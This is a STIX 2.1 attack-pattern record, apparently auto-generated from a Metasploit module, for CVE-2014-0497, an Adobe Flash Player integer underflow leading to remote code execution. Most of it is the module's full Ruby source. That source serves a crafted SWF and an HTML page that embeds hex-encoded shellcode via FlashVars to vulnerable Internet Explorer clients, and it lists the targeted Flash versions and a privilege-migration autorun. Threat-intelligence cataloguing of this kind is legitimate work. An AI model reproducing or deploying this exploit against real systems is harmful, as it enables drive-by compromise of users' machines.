{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6233cc9-c30c-4613-87fd-47b3460d0664",
    "created": "2024-08-14T16:41:54.124417Z",
    "modified": "2024-08-14T16:41:54.124422Z",
    "name": "\"Adobe Flash Player Integer Underflow Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player before 12.0.0.43. By supplying a specially crafted swf file it is possible to trigger an integer underflow in several avm2 instructions, which can be turned into remote code execution under the context of the user, as exploited in the wild in February 2014. This module has been tested successfully with Adobe Flash Player 11.7.700.202 on Windows XP SP3, Windows 7 SP1 and Adobe Flash Player 11.3.372.94 on Windows 8 even when it includes rop chains for several Flash 11 versions, as exploited in the wild.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_avm2.rb",
            "external_id": "adobe_flash_avm2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0497"
        },
        {
            "source_name": "reference",
            "url": "http://helpx.adobe.com/security/products/flash-player/apsb14-04.html"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/mmpc/archive/2014/02/17/a-journey-to-cve-2014-0497-exploit.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player Integer Underflow Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player\n        before 12.0.0.43. By supplying a specially crafted swf file it is possible to trigger an\n        integer underflow in several avm2 instructions, which can be turned into remote code\n        execution under the context of the user, as exploited in the wild in February 2014. This\n        module has been tested successfully with Adobe Flash Player 11.7.700.202 on Windows XP\n        SP3, Windows 7 SP1 and Adobe Flash Player 11.3.372.94 on Windows 8 even when it includes\n        rop chains for several Flash 11 versions, as exploited in the wild.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',     # vulnerability discovery and exploit in the wild\n          'juan vazquez' # msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-0497' ],\n          [ 'OSVDB', '102849' ],\n          [ 'BID', '65327' ],\n          [ 'URL', 'http://helpx.adobe.com/security/products/flash-player/apsb14-04.html' ],\n          [ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2014/02/17/a-journey-to-cve-2014-0497-exploit.aspx' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'Retries'              => false\n        },\n      'Platform'       => 'win',\n      # Versions targeted in the wild:\n      # [*] Windows 8:\n      #   11,3,372,94, 11,3,375,10, 11,3,376,12, 11,3,377,15, 11,3,378,5, 11,3,379,14\n      #   11,6,602,167, 11,6,602,171 ,11,6,602,180\n      #   11,7,700,169, 11,7,700,202, 11,7,700,224\n      # [*] Before windows 8:\n      #   11,0,1,152,\n      #   11,1,102,55, 11,1,102,62, 11,1,102,63\n      #   11,2,202,228, 11,2,202,233, 11,2,202,235\n      #   11,3,300,257, 11,3,300,273\n      #   11,4,402,278\n      #   11,5,502,110, 11,5,502,135, 11,5,502,146, 11,5,502,149\n      #   11,6,602,168, 11,6,602,171, 11,6,602,180\n      #   11,7,700,169, 11,7,700,202\n      #   11,8,800,97, 11,8,800,50\n     'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: '{D27CDB6E-AE6D-11cf-96B8-444553540000}',\n              method: 'LoadMovie'\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS,\n          :ua_name => Msf::HttpClients::IE,\n          :flash   => lambda { |ver| ver =~ /^11\\./ }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-02-05',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF...\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status(\"Sending HTML...\")\n    tag = retrieve_tag(cli, request)\n    profile = browser_profile[tag]\n    profile[:tried] = false unless profile.nil? # to allow request the swf\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    shellcode = get_payload(cli, target_info).unpack(\"H*\")[0]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"id=<%=shellcode%>\" />\n    <param name=\"Play\" value=\"true\" />\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2014-0497\", \"Vickers.swf\" )\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}